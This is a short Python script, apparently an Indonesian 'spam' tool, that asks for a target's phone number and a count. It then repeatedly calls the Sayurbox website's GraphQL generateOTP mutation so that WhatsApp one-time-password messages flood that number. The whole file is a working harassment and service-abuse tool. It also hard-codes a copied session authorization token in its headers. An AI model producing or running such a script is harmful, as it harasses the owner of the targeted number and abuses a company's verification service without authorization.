#module
import requests,json,os

os.system("clear")

no = input("Nomor Target : ")
jum = int(input("Jumlah spam : "))

head = {"Host": "www.sayurbox.com",
"content-length": "289",
"sec-ch-ua-mobile": "?1",
"authorization": "eyJhbGciOiJSUzI1NiIsImtpZCI6ImY4NDY2MjEyMTQxMjQ4NzUxOWJiZjhlYWQ4ZGZiYjM3ODYwMjk5ZDciLCJ0eXAiOiJKV1QifQ.eyJhbm9ueW1vdXMiOnRydWUsImF1ZCI6InNheXVyYm94LWF1ZGllbmNlIiwiYXV0aF90aW1lIjoxNjY5MTg2NjA2LCJleHAiOjE2NzE3Nzg2MDYsImlhdCI6MTY2OTE4NjYwNiwiaXNzIjoiaHR0cHM6Ly93d3cuc2F5dXJib3guY29tIiwibWV0YWRhdGEiOnsiZGV2aWNlX2luZm8iOm51bGx9LCJuYW1lIjpudWxsLCJwaWN0dXJlIjpudWxsLCJwcm92aWRlcl9pZCI6ImFub255bW91cyIsInNpZCI6IjM2OGRkNDg3LWI1NTYtNDc0Yy04OTFiLTU0M2U5ZDI4Y2JkNiIsInN1YiI6IkdSYkpYeC1XRVdldWVJTk1VWDRaSFlaSzRhYy0iLCJ1c2VyX2lkIjoiR1JiSlh4LVdFV2V1ZUlOTVVYNFpIWVpLNGFjLSJ9.cIxcllPPAfANqSn4fPm6XUjez4weRYDkHVuR4c0QrfudK8gZjrsCG45MPDgSayHrF031ZKW7jL7QW9zMbqaC7RPGpyw25nJlMBKQghQiWNUUH7pmnihLaJNWwqXiZYTtKdd8uNd_Coy0jhbTvMnUioOqDnJZ4w8hUIjidczAov-5097vHs071dKWYzoorSrbru6rzqCAQqp5cUdOIpzLihYCr1xMj4D0YkLOpwKYh-mirokpsuqbtDa9iyNT1TvUM9HWZVOehC22h01xSsoT8O7O3DlpetG48ur-5SD3rTtQzVx1ghCexF1ecBAJ3oJLCqEz8FjuUYcRmI7WOuUvKg",
"user-agent": "Mozilla/5.0 (Linux; Android 11; Infinix X688B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36",
"content-type": "application/json",
"accept": "*/*",
"x-bundle-revision": "17.4",
"x-sbox-tenant": "sayurbox",
"x-binary-version": "2.5.0",
"sec-ch-ua-platform": "Android",
"origin": "https://www.sayurbox.com",
"sec-fetch-site": "same-origin",
"sec-fetch-mode": "cors",
"sec-fetch-dest": "empty",
"accept-encoding": "gzip, deflate, br",
"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}

data = json.dumps([{"operationName":"generateOTP","variables":{"destinationType":"whatsapp","identity":"+62"+no},"query":"mutation generateOTP($destinationType: String!, $identity: String!) {\n  generateOTP(destinationType: $destinationType, identity: $identity) {\n    id\n    __typename\n  }\n}"}])
for i in range(jum):
  pos = requests.post("https://www.sayurbox.com/graphql/v1?deduplicate=1",headers=head,data=data).text
  if "__typename" in pos:
    print("Berhasil")
  else:
    print("Gagal")

